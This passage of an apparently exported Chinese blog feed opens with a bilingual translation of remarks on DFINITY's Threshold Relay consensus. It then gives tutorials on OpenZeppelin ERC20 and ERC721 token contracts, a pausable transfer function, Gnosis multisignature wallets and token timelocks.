<p>2014年初，我发现了一个DKG的”唯一确定性”的门限签名方案<a href="https://hal.inria.fr/hal-00983149/">https://hal.inria.fr/hal-00983149/document</a>，努力构建从<a href="https://hal.archives-ouvertes.fr/hal-01176110/document">https://hal.archives-ouvertes.fr/hal-01176110/document</a>派生的新协议。</p>
<p>As 2014 closed however, I concluded that eventually-consistent blockchain-like protocols driven by random numbers created using cryptography could be constructed that were far superior in the decentralized setting.</p>
<p>然而，截至2014年，我的结论是，在分布式环境中，可以构建出最终一致的区块链式协议，这种协议由使用密码技术创建的随机数驱动。</p>
<p>Readers may have observed Proof-of-Work drives eventual agreement using random number production (random “puzzle solutions”/hashes are used for leader selection). Clearly by moving the expense of Sybil resistance elsewhere, random numbers can be generated more efficiently.</p>
<p>读者可能已经观察到使用随机数生产（随机”谜题解决方案”/ 散列用于领导者选择）的工作证明驱动器最终协议。很显然，通过将Sybil阻力转移到别处，可以更有效地生成随机数。</p>
<p>Unique deterministic signature schemes can <em>only</em> produce a single signature (which is a big number) given some input message and key pair (= unmanipulability and verifiability) and signatures are random numbers or they would be predictable and the schemes thus insecure.</p>
<p>独特的确定性签名方案只能产生一个签名（一个很大的数字），给定一些输入消息和密钥对（= 不可处理性和可验证性），签名是随机数，或者它们是可预测的，因此此方案不安全。</p>
<p>Trivially, if everyone in the network has an unforgeable key pair (e.g. created by PoS) they could create a random “priority” number by signing the round/block height. If nodes only forward the block containing the highest priority number seen, voila, you have a blockchain.</p>
<p>如果网络中的每个人都有一个不可伪造的密钥对（例如由PoS创建的），他们可以通过签署轮数/块高度来创建一个具有”优先级”的随机数。如果节点只转发包含所看到的最高优先级数的块，瞧，你成功创建了一个区块链。</p>
<p>This is too simple for various reasons (it would be a selfish miner’s dream!!), but I developed many different schemes that generate or apply cryptographic randomness in the decentralized setting. Generally, I only talk about schemes DFINITY will use in the nearest future.</p>
<p>由于各种原因，这太简单了（这将是一个自私的矿工的梦想!!），但我开发了许多不同的方案，在分布式环境中产生或应用密码随机性。通常我只谈论DFINITY将在不久的将来使用的方案。</p>
<p>By early 2015 DFINITY research was using “Threshold Relay” to generate randomness.  On the advice of Dan Boneh, I started using BLS as the unique deterministic threshold signature scheme, and Benn Lynn (the “L” in BLS) works full time on DFINITY</p>
<p>到2015年初，DFINITY的研究使用”阈值继电器”来产生随机性。根据Dan Boneh的建议，我开始使用BLS作为唯一的确定性门限签名方案，而Benn Lynn（BLS中的”L”）全职工作于DFINITY。</p>
<p>Between then and now, DFINITY team members Timo Hanke (AsicBoost) and Mahnush Movahedi (Yale postdoc) have worked on this and derivative protocols, including “Probabilistic Slot Consensus”. The security properties and performance are stunning</p>
<p>至此之后，DFINITY团队成员Timo Hanke（AsicBoost）和Mahnush Movahedi（耶鲁博士后）一直致力于这一衍生协议，包括”概率性时隙共识”。安全属性和性能令人惊叹。</p>
<p>It turned out we could design blockchain protocols that are 1. far faster than those using traditional consensus, 2. scale to any number of participants as they should and 3. continue to make progress during asynchrony.</p>
<p>事实证明，我们设计区块链协议，1.比使用传统共识的区块链协议速度快得多; 2.参与者数量可以任意规模扩展; 3.在不同步时继续取得进展。</p>
<p>In its pursuit of unbounded capacity, DFINITY protocols rely upon the unmanipulable, unpredictable and highly fault tolerant production of random numbers by Threshold Relay. Powered by perfect randomness, DFINITY plans to change IT.</p>
<p>为了追求无限容量，DFINITY协议依靠阈值中继产生随机数，这些随机数是难以执行的，不可预测的和高度容错的。凭借完美的随机性，DFINITY计划使用它。</p>
<p>Back to the Q of whether Algorand’s “cryptographic sortition” is a big invention. Sounds fishy to me! What about Satoshi’s Proof-of-Work? Doesn’t he use cryptographically calculated random puzzle solutions to decide which new blocks are valid and what their priorities are?</p>
<p>回到Algorand的”密码分类”是否是一个重大发明的问题。听起来很腥！那么工作证明呢？他不使用密码计算的随机谜题解决方案来决定哪些新块是有效的，他们的优先级是什么？</p>
<p>But anyway, since Algorand is both much slower and less secure than Threshold Relay and PSC I don’t worry myself too much about it, notwithstanding Miscali’s MIT patent attorneys will have tried to be as broad as possible.</p>
<p>但无论如何，因为Algorand比Threshold Relay和PSC慢得多而且不太安全，所以我不用担心自己太多了，尽管Miscali的MIT专利律师会尽可能广泛地尝试。</p>
<p>Aside: given the Algorand patent situation, their claim to be the first truly “democratic ledger” is as ridiculous as Tezos claiming a “A new digital commonwealth” then redirecting investor funds back to themselves.</p>
<p>除此之外：鉴于Algorand的专利情况，他们声称自己是第一个真正的”民主分类账”，这是荒谬的，因为Tezos宣称”一个新的数字联邦”将投资者资金重新导回自己。</p>
<p>To wrap up, all theoretical work starts with important inputs. I think I was the first to apply cryptography in the ways described, but I drew inspiration from traditional asynchronous consensus algorithms and Nakamoto/PoW</p>
<p>总而言之，所有的理论工作都从重要的投入开始。我认为我是第一个以所描述的方式应用密码学的人，但我是从传统的异步共识算法和Nakamoto / PoW中取得的灵感。</p>
<p>Finally, I will make the claim that unless something better emerges, decentralization is going to be driven by random numbers generated by applied cryptography. Currently Threshold Relay and PSC are state of the art</p>
<p>最后，本人声称，除非有更好的选择出现，分布式将由应用密码学产生的随机数驱动。目前阈值继电器和PSC是最先进的。</p>
<p>Our foundational Threshold Relay protocol has probabilistic fault tolerance e.g.</p>
<ul>
<li>Network 10,000 nodes. 7,000 are correct. 3,000 are faulty</li>
<li>Group size 400, threshold 201</li>
<li>In this network, probability some group contains &gt;=200 faulty nodes, such that system stalls, is 10e-17</li>
</ul>
<p>我们的基础门限中继协议具有概率容错能力，例如</p>
<ul>
<li>网络10,000个节点。 7,000是正确的。 3,000是错误的；</li>
<li>集群规模400，门槛201；</li>
<li>在这个网络中，某个集群包含 &gt; = 200 个故障节点的概率（如系统失速）为10e-17</li>
</ul>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>ERC20-721Token的发行-冻结-多方签名功能</title>
    <url>/2019/07/04/ERC20-721Token%E7%9A%84%E5%8F%91%E8%A1%8C-%E5%86%BB%E7%BB%93-%E5%A4%9A%E6%96%B9%E7%AD%BE%E5%90%8D%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<h3 id="发行"><a href="#发行" class="headerlink" title="发行"></a>发行</h3><p>ERC 代币的发行已经标准化，最好采用 <a href="https://github.com/OpenZeppelin/openzeppelin-solidity">openzeppelin</a> 的模板，并搭配 solidity5.x 版本和 <a href="https://github.com/trufflesuite/truffle">truffle</a> 工具使用，效果更佳。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ERC 721</span></span><br><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/token/ERC721/ERC721Full.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/token/ERC721/ERC721Mintable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract MyNFT is ERC721Full, ERC721Mintable &#123;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>) <span class="title">ERC721Full</span>(<span class="params"><span class="string">&quot;MyNFT&quot;</span>, <span class="string">&quot;MNFT&quot;</span></span>) <span class="title">public</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ERC 20</span></span><br><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/token/ERC20/ERC20.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/token/ERC20/ERC20Detailed.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/ownership/Ownable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract MyERC20 is ERC20, ERC20Detailed, Ownable &#123;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params">uint256 initialSupply</span>) <span class="title">ERC20Detailed</span>(<span class="params"><span class="string">&quot;MyToken&quot;</span>, <span class="string">&quot;MT&quot;</span>, <span class="number">18</span></span>) <span class="title">public</span> &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Freeze-功能-（openzeppelin-contracts-v3-2-0之后）"><a href="#Freeze-功能-（openzeppelin-contracts-v3-2-0之后）" class="headerlink" title="Freeze 功能 （openzeppelin-contracts v3.2.0之后）"></a>Freeze 功能 （openzeppelin-contracts v3.2.0之后）</h3><p>也叫做 pause 或者 close，具体就是停止 Token 相关的 transfer（转账）功能</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ERC 20</span></span><br><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/token/ERC20/ERC20.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/token/ERC20/ERC20Detailed.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/ownership/Ownable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract MyERC20 is ERC20, ERC20Detailed, Ownable &#123;</span><br><span class="line">    bool public closed = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    event Close();</span><br><span class="line">    event Open();</span><br><span class="line"></span><br><span class="line">    <span class="title">constructor</span>(<span class="params">uint256 initialSupply</span>) <span class="title">ERC20Detailed</span>(<span class="params"><span class="string">&quot;MyToken&quot;</span>, <span class="string">&quot;MT&quot;</span>, <span class="number">18</span></span>) <span class="title">public</span> &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ------------------------------------------------------------------------</span></span><br><span class="line">    <span class="comment">// Don&#x27;t accept ETH</span></span><br><span class="line">    <span class="comment">// ------------------------------------------------------------------------</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        revert(<span class="string">&quot;Don&#x27;t accept ETH&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">whenOpen</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address _from, address _to, uint _value</span>) <span class="title">whenOpen</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.transferFrom(_from, _to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) <span class="title">onlyOwner</span> <span class="title">whenOpen</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        closed = <span class="literal">true</span>;</span><br><span class="line">        emit Close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"></span>) <span class="title">onlyOwner</span> <span class="title">whenClosed</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        closed = <span class="literal">false</span>;</span><br><span class="line">        emit Open();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="function"><span class="title">whenOpen</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">require</span>(!closed);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="function"><span class="title">whenClosed</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">require</span>(closed);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>openzeppelin-contracts v3.2.0版本中的实现代码如下 <code>ERC721Pausable</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract ERC721PresetMinterPauserAutoId is Context, AccessControl, ERC721Burnable, ERC721Pausable &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="MultiSigWallet-多方签名"><a href="#MultiSigWallet-多方签名" class="headerlink" title="MultiSigWallet 多方签名"></a>MultiSigWallet 多方签名</h3><p><a href="https://github.com/gnosis/MultiSigWallet">gnosis 的 multisignature 功能</a>最为完善。已经有多个生产项目采用此工具。目前此工具合约的 solidity 版本为0.4.15，项目语言版本交旧，但没有发生过安全问题。</p>
<p>首先 ERC20 合约的初始化总金额地址需要给到 MultiSigWallet 的合约地址，由 MultiSigWallet 合约完成多方签名确认后，ERC20 代币从 MultiSigWallet 合约的地址发送到接收人的账户地址。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ERC 20</span></span><br><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/token/ERC20/ERC20.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/token/ERC20/ERC20Detailed.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/ownership/Ownable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract MyERC20 is ERC20, ERC20Detailed, Ownable &#123;</span><br><span class="line">    bool public closed = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    event Close();</span><br><span class="line">    event Open();</span><br><span class="line"></span><br><span class="line">    <span class="title">constructor</span>(<span class="params">uint256 initialSupply</span>) <span class="title">ERC20Detailed</span>(<span class="params"><span class="string">&quot;MyToken&quot;</span>, <span class="string">&quot;MT&quot;</span>, <span class="number">18</span></span>) <span class="title">public</span> &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ------------------------------------------------------------------------</span></span><br><span class="line">    <span class="comment">// Do accept ETH, deposit token in contract address</span></span><br><span class="line">    <span class="comment">// ------------------------------------------------------------------------</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">whenOpen</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address _from, address _to, uint _value</span>) <span class="title">whenOpen</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.transferFrom(_from, _to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) <span class="title">onlyOwner</span> <span class="title">whenOpen</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        closed = <span class="literal">true</span>;</span><br><span class="line">        emit Close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"></span>) <span class="title">onlyOwner</span> <span class="title">whenClosed</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        closed = <span class="literal">false</span>;</span><br><span class="line">        emit Open();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="function"><span class="title">whenOpen</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">require</span>(!closed);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="function"><span class="title">whenClosed</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">require</span>(closed);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><a href="https://wallet.gnosis.pm/#/wallets">Live website 地址在这里</a>，以下操作均为<a href="https://wallet.gnosis.pm/%E4%B8%8A%E7%9A%84%E6%88%AA%E5%9B%BE%E3%80%82">https://wallet.gnosis.pm/上的截图。</a></p>
<p>1.增加钱包。如下图，完成钱包增加配置</p>
<p><img src="/2019/07/04/ERC20-721Token%E7%9A%84%E5%8F%91%E8%A1%8C-%E5%86%BB%E7%BB%93-%E5%A4%9A%E6%96%B9%E7%AD%BE%E5%90%8D%E5%8A%9F%E8%83%BD/image-20190704164401192.png"></p>
<p>2.点击 Wallets Name，即点击’Lcoin’，进入钱包的详细页面，如下图，进入后需要手动添加 Tokens Name，其后点击 Withdraw，最后经过 2 位 Required confirmations 后，Executed 状态变为 Yes</p>
<p>注意，此处，由 MultiSigWallet 合约完成多方签名确认后，ERC20 代币从 MultiSigWallet 合约的地址发送到接收人的账户地址（a825），MultiSigWallet 合约执行 transfer 给到接收人的账户地址（a825），所以 MultiSigWallet 合约的地址上需要有足够的 Eth 作为 gas</p>
<p>即使用 MultiSigWallet 转账时，花费的 gas 是 2 位 Required confirmations 和一次 transfer 的总和</p>
<p><img src="/2019/07/04/ERC20-721Token%E7%9A%84%E5%8F%91%E8%A1%8C-%E5%86%BB%E7%BB%93-%E5%A4%9A%E6%96%B9%E7%AD%BE%E5%90%8D%E5%8A%9F%E8%83%BD/image-20190704164559721.png"></p>
<p>3.如下图，虽然在 MultiSigWallet中可以选择到调用 ERC20 合约中的 close 函数，但是 close 函数并不受 MultiSigWallet 的控制，由onlyOwner，即 msg.sender 单独控制并操作</p>
<p><img src="/2019/07/04/ERC20-721Token%E7%9A%84%E5%8F%91%E8%A1%8C-%E5%86%BB%E7%BB%93-%E5%A4%9A%E6%96%B9%E7%AD%BE%E5%90%8D%E5%8A%9F%E8%83%BD/image-20190704163730558.png"></p>
<p>4.如下图，具体交易的内容在 MultiSigWallet，并配合etherscan 和 MyEtherWallet 中的结果</p>
<p><img src="/2019/07/04/ERC20-721Token%E7%9A%84%E5%8F%91%E8%A1%8C-%E5%86%BB%E7%BB%93-%E5%A4%9A%E6%96%B9%E7%AD%BE%E5%90%8D%E5%8A%9F%E8%83%BD/WechatIMG214.png"></p>
<p><img src="/2019/07/04/ERC20-721Token%E7%9A%84%E5%8F%91%E8%A1%8C-%E5%86%BB%E7%BB%93-%E5%A4%9A%E6%96%B9%E7%AD%BE%E5%90%8D%E5%8A%9F%E8%83%BD/WechatIMG216.png"></p>
<p><img src="/2019/07/04/ERC20-721Token%E7%9A%84%E5%8F%91%E8%A1%8C-%E5%86%BB%E7%BB%93-%E5%A4%9A%E6%96%B9%E7%AD%BE%E5%90%8D%E5%8A%9F%E8%83%BD/WechatIMG217.png"></p>
<p>关联内容 ==&gt; <a href="https://willzhuang.github.io/2020/09/07/ERC721%E5%AE%9E%E8%B7%B5/">https://willzhuang.github.io/2020/09/07/ERC721%E5%AE%9E%E8%B7%B5/</a>实践</p>
]]></content>
      <tags>
        <tag>Token</tag>
      </tags>
  </entry>
  <entry>
    <title>ERC20时间锁</title>
    <url>/2019/09/19/ERC20%E6%97%B6%E9%97%B4%E9%94%81/</url>
    <content><![CDATA[<p>使用<a href="https://github.com/OpenZeppelin/openzeppelin-contracts">https://github.com/OpenZeppelin/openzeppelin-contracts</a> 中的</p>
<p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d864228624e3661eaf10b7d00995110116e51094/contracts/token/ERC20/TokenTimelock.sol">openzeppelin-contracts/contracts/token/ERC20/TokenTimelock.sol</a>，为每个人放置 release 的时间和数量。</p>
<p><a href="Token-time-lock-Guide-20190924.docx"><strong>使用说明整理文档==&gt;link</strong></a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./SafeERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev </span>A token holder contract that will allow a beneficiary to extract the</span></span><br><span class="line"><span class="comment"> * tokens after a given release time.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Useful for simple vesting schedules like &quot;advisors get all of their tokens</span></span><br><span class="line"><span class="comment"> * after 1 year&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For a more complete vesting schedule, see &#123;TokenVesting&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract TokenTimelock &#123;</span><br><span class="line">    using SafeERC20 <span class="keyword">for</span> IERC20;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ERC20 basic token contract being held</span></span><br><span class="line">    IERC20 private _token;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// beneficiary of tokens after they are released</span></span><br><span class="line">    address private _beneficiary;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// timestamp when token release is enabled</span></span><br><span class="line">    uint256 private _releaseTime;</span><br><span class="line"></span><br><span class="line">    <span class="title">constructor</span> (<span class="params">IERC20 token, address beneficiary, uint256 releaseTime</span>) <span class="title">public</span> &#123;</span><br><span class="line">        <span class="comment">// solhint-disable-next-line not-rely-on-time</span></span><br><span class="line">        <span class="built_in">require</span>(releaseTime &gt; block.timestamp, <span class="string">&quot;TokenTimelock: release time is before current time&quot;</span>);</span><br><span class="line">        _token = token;</span><br><span class="line">        _beneficiary = beneficiary;</span><br><span class="line">        _releaseTime = releaseTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return </span>the token being held.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">token</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">IERC20</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return </span>the beneficiary of the tokens.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">beneficiary</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _beneficiary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return </span>the time when the tokens are released.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">releaseTime</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _releaseTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@notice </span>Transfers tokens held by timelock to beneficiary.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">release</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// solhint-disable-next-line not-rely-on-time</span></span><br><span class="line">        <span class="built_in">require</span>(block.timestamp &gt;= _releaseTime, <span class="string">&quot;TokenTimelock: current time is before release time&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uint256 amount = _token.balanceOf(address(<span class="built_in">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(amount &gt; <span class="number">0</span>, <span class="string">&quot;TokenTimelock: no tokens to release&quot;</span>);</span><br><span class="line"></span><br><span class="line">        _token.safeTransfer(_beneficiary, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Token</tag>
      </tags>
  </entry>
  <entry>
    <title>ERC721实践</title>
    <url>/2020/09/07/ERC721%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<p>​    ERC721是比ERC20更复杂的标准，具有多个可选扩展名，并且分为多个合约。 <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC721">OpenZeppelin合约</a>提供了灵活的组合方式以及自定义有用的扩展。本文讲解以OpenZeppelin合约为目标对象。</p>
<h3 id="构建ERC721代币合同"><a href="#构建ERC721代币合同" class="headerlink" title="构建ERC721代币合同"></a>构建ERC721代币合同</h3><p>​    我们将使用ERC721来跟踪游戏中的装备条目，每个条目都有各自独特的属性。 每当要奖励给玩家时，便会铸造（mint）并发送给他们。 玩家可以自由保留自己的代币，也可以与自己认为合适的其他人进行交易，就像区块链上的任何其他资产一样！ 请注意，任何帐户都可以将awardItem称为铸造（mint）。 为了限制可以创建项目的帐户，我们可以<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/docs/modules/ROOT/pages/access-control.adoc">添加访问控制</a>。</p>
<p>​    合约如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// contracts/GameItem.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Counters.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract GameItem is ERC721 &#123;</span><br><span class="line">    using Counters <span class="keyword">for</span> Counters.Counter;</span><br><span class="line">    Counters.Counter private _tokenIds;</span><br><span class="line"></span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">ERC721</span>(<span class="params"><span class="string">&quot;GameItem&quot;</span>, <span class="string">&quot;ITM&quot;</span></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">awardItem</span>(<span class="params">address player, string memory tokenURI</span>)</span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> (<span class="params">uint256</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _tokenIds.increment();</span><br><span class="line"></span><br><span class="line">        uint256 newItemId = _tokenIds.current();</span><br><span class="line">        _mint(player, newItemId);</span><br><span class="line">        _setTokenURI(newItemId, tokenURI);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> newItemId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    ERC721合约包括了标准扩展（<code>IERC721Metadata</code>和<code>IERC721Enumerable</code>）。 这就是_setTokenURI方法的来源：我们使用它来存储项目的元数据。</p>
<p>​    另请注意：与ERC20不同，ERC721缺少小数，因为每个令牌都是不同的，并且无法分区。</p>
<p>​    新项目示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> gameItem.awardItem(playerAddress, <span class="string">&quot;https://game.example/item-id-8u5h2m.json&quot;</span>)</span></span><br><span class="line">Transaction successful. Transaction hash: 0x...</span><br><span class="line">Events emitted:</span><br><span class="line"> - Transfer(0x0000000000000000000000000000000000000000, playerAddress, 7)</span><br></pre></td></tr></table></figure>

<p>​    查询每个项目的所有者和元数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> gameItem.ownerOf(7)</span></span><br><span class="line">playerAddress</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> gameItem.tokenURI(7)</span></span><br><span class="line">&quot;https://game.example/item-id-8u5h2m.json&quot;</span><br></pre></td></tr></table></figure>

<p>​    此tokenURI应该解析为一个类似于以下内容的JSON文档：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Thor&#x27;s hammer&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Mjölnir, the legendary hammer of the Norse god of thunder.&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;image&quot;</span>: <span class="string">&quot;https://game.example/item-id-8u5h2m.png&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;strength&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

